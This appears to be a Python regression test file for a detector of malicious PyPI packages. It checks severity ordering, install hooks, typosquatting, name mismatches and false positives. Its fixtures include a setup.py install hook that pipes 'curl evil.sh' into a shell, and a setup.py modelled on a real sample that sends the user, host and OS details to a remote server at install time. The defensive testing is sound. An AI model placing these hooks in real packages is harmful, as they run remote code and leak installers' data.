# -*- coding: utf-8 -*-
"""回归测试:增强检测器(severity 排序/console_scripts 降级/词界/pyproject 依赖)"""
import sys
import shutil
import tempfile
from pathlib import Path

NEW_DDG = Path(__file__).parent.parent
sys.path.insert(0, str(NEW_DDG))

from src.enhanced_detector import EnhancedSecurityDetector


def make_dir(files: dict) -> Path:
    d = Path(tempfile.mkdtemp(prefix="ed_test_"))
    for name, content in files.items():
        (d / name).write_text(content, encoding="utf-8")
    return d


def test_severity_ordering():
    """修复回归:critical+medium 的威胁组,threat_level 必须是 critical(字典序 bug 会给 medium)"""
    det = EnhancedSecurityDetector()
    assert det._max_severity([{'severity': 'critical'}, {'severity': 'medium'}]) == 'critical'
    assert det._max_severity([{'severity': 'low'}, {'severity': 'high'}]) == 'high'
    assert det._max_severity([{'severity': 'medium'}, {'severity': 'low'}]) == 'medium'
    print("[OK] severity 按等级序比较")


def test_console_scripts_not_fatal():
    """核心验收:带 console_scripts 入口的正常 setup.py 不再被判 critical/high"""
    det = EnhancedSecurityDetector()
    d = make_dir({'setup.py': """from setuptools import setup
setup(
    name='normalcli',
    version='1.0',
    entry_points={'console_scripts': ['normalcli=normalcli.main:main']}
)
"""})
    result = det._analyze_setup_py(d)
    assert result['threat_level'] not in ('critical', 'high'), \
        f"console_scripts 不应判死: {result}"
    # 整包也不应因 entry_points 短路 MALICIOUS
    overall = det.analyze_package(d)
    assert overall['overall_threat_level'] not in ('critical', 'high'), \
        f"正常CLI包整体不应 critical/high: {overall['overall_threat_level']}"
    shutil.rmtree(d, ignore_errors=True)
    print("[OK] console_scripts 正常包不再判死")


def test_real_install_hook_still_critical():
    """真安装钩子(cmdclass install + class)仍应 critical"""
    det = EnhancedSecurityDetector()
    d = make_dir({'setup.py': """from setuptools import setup
class MaliciousInstall:
    def run(self):
        __import__('os').system('curl evil.sh | sh')
setup(name='evil', cmdclass={'install': MaliciousInstall})
"""})
    result = det._analyze_setup_py(d)
    assert result['threat_level'] == 'critical', f"安装钩子应 critical: {result}"
    shutil.rmtree(d, ignore_errors=True)
    print("[OK] 真安装钩子保持 critical")


def test_name_word_boundary():
    """包名子串匹配加词界:shellcraft 不命中,backdoor-tool 命中 high"""
    det = EnhancedSecurityDetector()
    d = make_dir({'PKG-INFO': "Name: shellcraft\nAuthor: someone\n"})
    r1 = det._analyze_metadata(d)
    name_threats = [t for t in r1['threats'] if t['type'] == 'suspicious_package_name']
    assert not any(t['pattern_type'] == 'obvious_malicious' for t in name_threats), \
        f"shellcraft 不应命中强恶意词: {name_threats}"
    shutil.rmtree(d, ignore_errors=True)

    d2 = make_dir({'PKG-INFO': "Name: backdoor-tool\n"})
    r2 = det._analyze_metadata(d2)
    name_threats2 = [t for t in r2['threats'] if t['type'] == 'suspicious_package_name']
    assert any(t['severity'] == 'high' for t in name_threats2), f"backdoor 应命中 high: {name_threats2}"
    shutil.rmtree(d2, ignore_errors=True)
    print("[OK] 包名词界匹配")


def test_pyproject_dependencies():
    """pyproject.toml (PEP 621) 依赖现在能被解析和检测"""
    det = EnhancedSecurityDetector()
    d = make_dir({'pyproject.toml': """[project]
name = "sample"
dependencies = ["reqeusts>=2.0", "flask"]
"""})
    result = det._analyze_dependencies(d)
    assert 'reqeusts' in result['dependencies'], f"PEP 621 依赖应被提取: {result['dependencies']}"
    assert any(t.get('pattern_type') == 'typosquatting' for t in result['threats']), \
        f"typosquatting 依赖应被检出: {result['threats']}"
    shutil.rmtree(d, ignore_errors=True)
    print("[OK] pyproject.toml 依赖解析")


def test_install_time_exfiltration():
    """修复回归(真实样本 openvc):安装脚本里 环境侦察+网络发送 同现 → critical"""
    det = EnhancedSecurityDetector()
    d = make_dir({'setup.py': """from distutils.core import setup
import sys, socket, base64, os, getpass, platform
from urllib import request

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    vid = user_name + "###" + hostname + "###" + os_version
    request.urlopen('http://openvc.org/checkVersion.php',
                    data='vid='.encode('utf-8') + base64.b64encode(vid.encode('utf-8')))
checkVersion()
setup(name='openvc', version='1.0.0')
"""})
    r = det._analyze_setup_py(d)
    assert any(t.get('type') == 'install_time_exfiltration' for t in r['threats']), \
        f"安装期侦察+外传应被检出: {r['threats']}"
    assert r['threat_level'] == 'critical'
    shutil.rmtree(d, ignore_errors=True)
    print("[OK] 安装期信息窃取 → critical")


def test_name_mismatch_critical():
    """修复回归(真实样本 botaa3):发行名与元数据 Name 不一致 → critical"""
    det = EnhancedSecurityDetector()
    d = make_dir({'PKG-INFO': "Name: boto3\nVersion: 1.20.7\n"})
    r = det.analyze_package(d, dist_name='botaa3-1.0.0')
    assert r['overall_threat_level'] == 'critical', f"名称不一致应 critical: {r['overall_threat_level']}"
    assert any(t.get('type') == 'name_mismatch' for t in r['threats_found'])
    shutil.rmtree(d, ignore_errors=True)
    print("[OK] 发行名/元数据不一致 → critical")


def test_typosquat_dist_name():
    """修复回归(真实样本 python-dateutils):与流行包编辑距离<=1 → critical"""
    det = EnhancedSecurityDetector()
    d = make_dir({'PKG-INFO': "Name: python-dateutils\nVersion: 3.0.3\n"})
    r = det.analyze_package(d, dist_name='python-dateutils-3.0.3')
    types = [t.get('type') for t in r['threats_found']]
    assert 'typosquatting' in types, f"应识别 typosquatting: {types}"
    assert r['overall_threat_level'] == 'critical'
    shutil.rmtree(d, ignore_errors=True)
    print("[OK] typosquat 包名 → critical")


def test_pypi_verify_hook():
    """PyPI 核验开关:not_found → critical;verify_pypi=False 时不联网"""
    import src.pypi_verifier as pv
    det = EnhancedSecurityDetector()
    d = make_dir({'PKG-INFO': "Name: totally-unique-xyz\nVersion: 1.0\n"})
    orig = pv.verify_distribution
    pv.verify_distribution = lambda n, v='', timeout=10.0: {
        'status': 'not_found', 'reason': 'mocked 404', 'official_name': None}
    try:
        r = det.analyze_package(d, dist_name='totally-unique-xyz-1.0', verify_pypi=True)
        assert r['overall_threat_level'] == 'critical', r['overall_threat_level']
        assert any(t.get('type') == 'pypi_not_found' for t in r['threats_found'])
        # 关闭时不应联网/不应产生该威胁
        r2 = det.analyze_package(d, dist_name='totally-unique-xyz-1.0', verify_pypi=False)
        assert not any(t.get('type', '').startswith('pypi_') for t in r2['threats_found'])
    finally:
        pv.verify_distribution = orig
    shutil.rmtree(d, ignore_errors=True)
    print("[OK] PyPI 核验（开关可控）")


def test_benign_genuine_name_not_flagged():
    """良性对照:发行名与元数据一致且非流行包 → 无名称类威胁"""
    det = EnhancedSecurityDetector()
    d = make_dir({'PKG-INFO': "Name: my-own-tool\nVersion: 1.0\n"})
    r = det.analyze_package(d, dist_name='my-own-tool-1.0')
    types = [t.get('type') for t in r['threats_found']]
    assert 'name_mismatch' not in types and 'typosquatting' not in types, types
    shutil.rmtree(d, ignore_errors=True)
    print("[OK] 正常自有包名不误报")


if __name__ == '__main__':
    test_severity_ordering()
    test_console_scripts_not_fatal()
    test_real_install_hook_still_critical()
    test_name_word_boundary()
    test_pyproject_dependencies()
    test_install_time_exfiltration()
    test_name_mismatch_critical()
    test_typosquat_dist_name()
    test_pypi_verify_hook()
    test_benign_genuine_name_not_flagged()
    print("\n===== test_enhanced_detector 全部通过 =====")
